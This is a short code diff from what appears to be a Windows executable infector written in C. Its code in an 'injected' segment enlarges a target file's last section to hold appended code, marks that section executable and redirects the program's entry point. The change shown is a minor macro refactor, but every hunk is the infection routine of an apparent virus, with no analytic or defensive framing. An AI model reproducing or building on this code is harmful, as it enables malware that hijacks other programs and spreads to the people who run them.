@@ -110,8 +110,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         dwFileSize = pGetFileSize(hFile, NULL);
-#pragma warning(suppress : 4146)
-        dwNewFileSize = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(code_size, 512), 512);
+        dwNewFileSize = ALIGN(dwFileSize + ALIGN(code_size, 512), 512);
         // ^ TODO: Get file alignment from PE header instead of hardcoding 512
         //         Load file in read-only mode and reopen in RW later
         //         Perform as many checks as possible in read-only mode
@@ -157,8 +156,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
             }
         }
 
-#pragma warning(suppress : 4146)
-        dwSizeAligned = PG_ALIGN_UP(code_size, pNtHeader->OptionalHeader.FileAlignment);
+        dwSizeAligned = ALIGN(code_size, pNtHeader->OptionalHeader.FileAlignment);
         // ^ Compute aligned size earlier
         pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
@@ -166,9 +164,8 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
                                                     ? dwSizeAligned
                                                     : pLastSection->SizeOfRawData;
         pNtHeader->OptionalHeader.SizeOfImage =
-#pragma warning(suppress : 4146)
-            PG_ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
-                        pNtHeader->OptionalHeader.SectionAlignment);
+            ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
+                  pNtHeader->OptionalHeader.SectionAlignment);
         pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
         pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
         pNtHeader->OptionalHeader.AddressOfEntryPoint =
